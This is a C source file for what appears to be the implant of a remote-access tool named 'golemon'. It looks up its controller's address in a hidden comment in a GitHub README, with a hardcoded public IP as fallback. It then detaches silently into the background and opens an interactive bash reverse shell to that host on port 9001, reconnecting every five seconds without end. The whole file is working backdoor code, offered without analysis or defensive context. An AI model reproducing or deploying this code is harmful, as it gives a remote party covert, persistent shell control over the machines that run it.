#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pty.h>
#include <sys/wait.h>
#include <curl/curl.h>
#include <signal.h>

#define README_URL "https://raw.githubusercontent.com/dilipk5/golemon/refs/heads/main/README.md"
#define BUFFER_SIZE 1024

// Callback structure for curl
struct MemoryStruct {
    char *memory;
    size_t size;
};

// Callback function for curl to write data
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    
    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) {
        return 0;
    }
    
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    
    return realsize;
}

// Extract server IP from README content
char* extract_server_ip(const char *content) {
    // Look for pattern: <!-- SERVER_IP = xxx.xxx.xxx.xxx -->
    const char *marker = "<!-- SERVER_IP = ";
    char *start = strstr(content, marker);
    
    if (!start) {
        return NULL;
    }
    
    start += strlen(marker);
    
    // Skip any whitespace or extra text before IP
    while (*start && (*start == ' ' || (*start >= 'a' && *start <= 'z') || (*start >= 'A' && *start <= 'Z'))) {
        start++;
    }
    
    char *end = strstr(start, " -->");
    if (!end) {
        end = strstr(start, "-->");
    }
    
    if (!end) {
        return NULL;
    }
    
    // Trim trailing spaces
    while (end > start && *(end - 1) == ' ') {
        end--;
    }
    
    size_t ip_len = end - start;
    char *ip = malloc(ip_len + 1);
    if (ip) {
        strncpy(ip, start, ip_len);
        ip[ip_len] = '\0';
    }
    
    return ip;
}

// Fetch server IP from GitHub README
char* fetch_server_ip() {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    char *server_ip = NULL;
    
    chunk.memory = malloc(1);
    chunk.size = 0;
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, README_URL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "golemon-agent/1.0");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        
        res = curl_easy_perform(curl);
        
        if (res == CURLE_OK) {
            server_ip = extract_server_ip(chunk.memory);
        }
        
        curl_easy_cleanup(curl);
    }
    
    free(chunk.memory);
    curl_global_cleanup();
    
    return server_ip;
}

int main(int argc, char *argv[]) {
    char *server_ip = NULL;
    int server_port = 9001;
    
    // Try to fetch server IP from GitHub README
    server_ip = fetch_server_ip();
    
    // Fallback to hardcoded IP if fetch fails
    if (!server_ip) {
        server_ip = strdup("3.111.197.63");
    }
    
    // Daemonize immediately on first run
    static int first_run = 1;
    if (first_run) {
        first_run = 0;
        pid_t daemon_pid = fork();
        
        if (daemon_pid < 0) {
            perror("Fork failed");
            exit(EXIT_FAILURE);
        }
        
        if (daemon_pid > 0) {
            // Parent process - exit and return to shell
            exit(EXIT_SUCCESS);
        }
        
        // Child continues as daemon
        setsid();
        close(STDIN_FILENO);
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
    }
    
    // Reconnection loop - retry every 5 seconds if connection fails
    while (1) {
        int sock;
        struct sockaddr_in server_addr;
        int master_fd;
        pid_t pid;
        char buffer[BUFFER_SIZE];
        fd_set read_fds;
        int max_fd;

        // Try to fetch updated server IP from GitHub README before each connection attempt
        char *new_server_ip = fetch_server_ip();
        if (new_server_ip) {
            // Successfully fetched new IP - update server_ip
            free(server_ip);
            server_ip = new_server_ip;
        }
        // If fetch fails, continue using the previous server_ip

        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            sleep(5);  // Wait 5 seconds before retry
            continue;
        }

        // Setup server address structure
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);
        
        if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
            close(sock);
            sleep(5);  // Wait 5 seconds before retry
            continue;
        }

        // Connect to server
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            close(sock);
            sleep(5);  // Wait 5 seconds before retry
            continue;
        }

        // Successfully connected - spawn PTY shell
        pid = forkpty(&master_fd, NULL, NULL, NULL);
        
        if (pid < 0) {
            close(sock);
            sleep(5);  // Wait 5 seconds before retry
            continue;
        }
        
        if (pid == 0) {
            // Child process - execute shell
            char *args[] = {"/bin/bash", NULL};
            execve("/bin/bash", args, NULL);
            exit(EXIT_FAILURE);
        }

        // Parent process - relay data between socket and PTY
        max_fd = (sock > master_fd ? sock : master_fd) + 1;

        while (1) {
            FD_ZERO(&read_fds);
            FD_SET(sock, &read_fds);
            FD_SET(master_fd, &read_fds);

            if (select(max_fd, &read_fds, NULL, NULL, NULL) < 0) {
                break;
            }

            // Data from server -> PTY (shell input)
            if (FD_ISSET(sock, &read_fds)) {
                ssize_t n = read(sock, buffer, BUFFER_SIZE);
                if (n <= 0) {
                    break;  // Server disconnected - will reconnect
                }
                write(master_fd, buffer, n);
            }

            // Data from PTY -> server (shell output)
            if (FD_ISSET(master_fd, &read_fds)) {
                ssize_t n = read(master_fd, buffer, BUFFER_SIZE);
                if (n <= 0) {
                    break;  // Shell exited - will reconnect
                }
                write(sock, buffer, n);
            }
        }

        // Connection lost - cleanup and prepare to reconnect
        close(master_fd);
        close(sock);
        kill(pid, SIGTERM);
        waitpid(pid, NULL, 0);
        
        // Wait 5 seconds before attempting reconnection
        sleep(5);
    }

    return 0;
}
